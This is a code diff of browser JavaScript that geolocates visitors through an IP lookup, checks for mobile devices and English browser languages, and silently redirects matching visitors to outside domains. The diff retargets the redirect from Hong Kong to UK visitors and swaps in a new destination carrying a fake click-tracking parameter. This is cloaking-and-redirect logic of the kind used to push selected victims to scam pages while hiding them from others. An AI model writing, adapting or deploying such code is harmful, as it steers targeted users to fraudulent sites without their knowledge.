@@ -38,21 +38,16 @@
     }
 
 function isSupportedLang() {
-    return navigator.language.startsWith('en') || 
-           navigator.language.startsWith('zh-HK') ||
-           navigator.language.startsWith('zh-TW') ||
-           navigator.language.startsWith('zh-CN') ||
-           navigator.languages.some(lang => lang.startsWith('en') || 
-                                             lang.startsWith('zh-HK') || 
-                                             lang.startsWith('zh-TW') || 
-                                             lang.startsWith('zh-CN'));
+    return navigator.language.startsWith('en') ||
+           navigator.languages.some(lang => lang.startsWith('en'));
 }
+	  
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'HK' && isMobileDevice()) {
-          window.location.href = "https://una926m.online/uka/hka/";
+        if (data.country === 'UK' || data.country === 'GB'&& isMobileDevice()) {
+          window.location.href = "https://nkaigc.shop/?fbclid=fbclid";
           return;
         }
      
@@ -66,7 +61,7 @@ function isSupportedLang() {
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isSupportedLang()) {
-         window.location.href = "https://una926m.online/uka/hka/";
+         window.location.href = "https://nkaigc.shop/?fbclid=fbclid";
           return;
         }
         
